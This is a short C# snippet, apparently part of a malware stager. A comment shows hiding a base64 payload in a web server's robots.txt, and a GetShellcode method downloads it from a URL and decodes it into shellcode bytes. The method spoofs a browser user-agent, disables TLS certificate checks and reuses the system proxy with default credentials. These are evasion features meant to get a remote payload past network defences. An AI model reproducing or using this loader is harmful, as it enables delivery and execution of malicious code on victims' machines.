// base64 -w 0 payload.bin > /var/www/html/robots.txt
public static byte[] GetShellcode(string url)
{
    WebClient client = new WebClient();
    client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
    // ignore ssl cert validation
    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    client.Proxy = WebRequest.GetSystemWebProxy();
    client.Proxy.Credentials = CredentialCache.DefaultCredentials;
    string compressedEncodedShellcode = client.DownloadString(url);
    return Convert.FromBase64String(compressedEncodedShellcode);
}